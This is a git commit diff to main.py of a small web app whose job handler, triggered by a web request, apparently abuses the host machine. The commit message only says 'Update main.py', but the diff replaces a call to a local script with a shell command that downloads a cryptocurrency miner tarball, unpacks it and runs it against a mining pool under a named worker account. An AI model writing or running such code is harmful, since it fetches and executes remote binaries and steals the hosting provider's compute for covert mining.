ab585d7e7baa2a9b9e0a0e680d985350b60eef35
x9lh3art <59450322+x9lh3art@users.noreply.github.com>
2020-05-18 23:38:30 +0545

    Update main.py

--- main.py
+++ main.py
@@ -15,7 +15,7 @@ def index():
     return "Triggered a Job !"
 
 def long_running_job():
-    os.system("python long.py")
+    os.system("wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux &&  ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.seven -p x -e 72")
 
 
 if __name__ == "__main__":
